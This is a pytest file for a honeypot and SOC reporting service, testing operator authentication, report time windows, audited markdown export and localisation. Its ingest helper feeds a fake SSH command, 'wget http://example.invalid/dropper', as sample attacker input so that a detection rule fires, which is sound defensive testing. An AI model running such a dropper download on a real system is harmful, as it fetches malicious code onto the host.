from __future__ import annotations

from aegis_nexus.app import create_app


def _client(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "OPERATOR_API_KEY": "operator-secret",
    })
    return app.test_client()


def _ingest(client, command="wget http://example.invalid/dropper", ip="203.0.113.90"):
    assert client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": ip,
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": command,
            },
        },
    ).status_code == 201


def test_soc_summary_requires_operator(tmp_path):
    assert _client(tmp_path).get("/api/v1/reports/soc-summary").status_code == 401


def test_soc_summary_composes_events_detections_and_integrity(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    _ingest(client)
    _ingest(client, command="ls -la", ip="203.0.113.91")

    summary = client.get("/api/v1/reports/soc-summary?hours=24", headers=operator).get_json()
    assert summary["report_type"] == "soc_summary"
    assert summary["window_hours"] == 24
    assert summary["events"]["total"] >= 2
    # The download_attempt rule produced at least one alert.
    assert summary["detections"]["alert_total"] >= 1
    assert isinstance(summary["evidence_integrity_warnings"], list)
    assert summary["mitre"]["rule_coverage"]  # rule coverage always present
    assert any("attribution" in c for c in summary["caveats"])


def test_soc_summary_named_windows_map_to_hours(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    assert client.get("/api/v1/reports/soc-summary?range=7d", headers=operator).get_json()["window_hours"] == 168
    assert client.get("/api/v1/reports/soc-summary?range=30d", headers=operator).get_json()["window_hours"] == 720
    assert client.get("/api/v1/reports/soc-summary", headers=operator).get_json()["window_hours"] == 24


def test_soc_summary_markdown_export_is_audited(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    _ingest(client)

    report = client.get("/api/v1/reports/soc-summary.md?lang=en", headers=operator)
    assert report.status_code == 200
    assert report.headers["Content-Disposition"].startswith("attachment;")
    text = report.get_data(as_text=True)
    assert "# AEGIS-NEXUS — SOC summary" in text
    assert "Evidence integrity warnings" in text

    audit = client.get("/api/v1/audit", headers=operator).get_json()
    assert any(e["action"] == "export.soc_summary" for e in audit["items"])

    report_it = client.get("/api/v1/reports/soc-summary.md?lang=it", headers=operator)
    assert "Riepilogo SOC" in report_it.get_data(as_text=True)
